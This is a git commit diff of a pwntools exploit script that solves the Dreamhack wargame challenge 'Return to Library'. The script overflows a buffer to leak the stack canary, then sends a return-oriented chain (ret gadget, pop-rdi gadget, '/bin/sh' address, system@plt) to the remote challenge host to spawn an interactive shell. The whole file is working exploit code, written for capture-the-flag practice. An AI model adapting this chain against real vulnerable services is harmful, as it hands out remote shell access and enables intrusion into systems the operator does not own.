e5490199a11bd8d2d8cca73d13fa73a14c5d3b2a
Brian Lee <hibrian827@gmail.com>
2024-07-26 01:47:12 +0900

    solved return to library

--- Dreamhack/Return to Library/answer.py
+++ Dreamhack/Return to Library/answer.py
@@ -1,10 +1,8 @@
 from pwn import *
 
 port = 14397
-# rem = remote("host1.dreamhack.games", port)
-rem = process('./rop/problem/rop')
-elf = ELF('./rop/problem/rop')
-lib = ELF('./rop/problem/libc.so.6')
+rem = remote("host1.dreamhack.games", port)
+elf = ELF('./Return to Library/problem/rtl')
 
 payload = b'A' * 0x39
 rem.sendafter(b'Buf: ', payload)
@@ -13,19 +11,16 @@ canary = u64(b'\x00' + rem.recvn(7))
 
 payload = b'A' * 0x38
 payload += p64(canary)
-print(payload)
-
-temp = 0x400596
-gadget = 0x400853
-shell = list(lib.search(b"/bin/sh"))[0]
-sys_offset = lib.symbols["system"]
-
 payload += b'\x00' * 0x8
+
+temp = 0x400285
+gadget = 0x400853
+shell = 0x400874
+sysplt = elf.plt['system']
 payload += p64(temp)
 payload += p64(gadget)
 payload += p64(shell)
-payload += p64(system_offset)
-print(payload)
+payload += p64(sysplt)
 rem.sendafter(b'Buf: ', payload)
 
 rem.interactive()
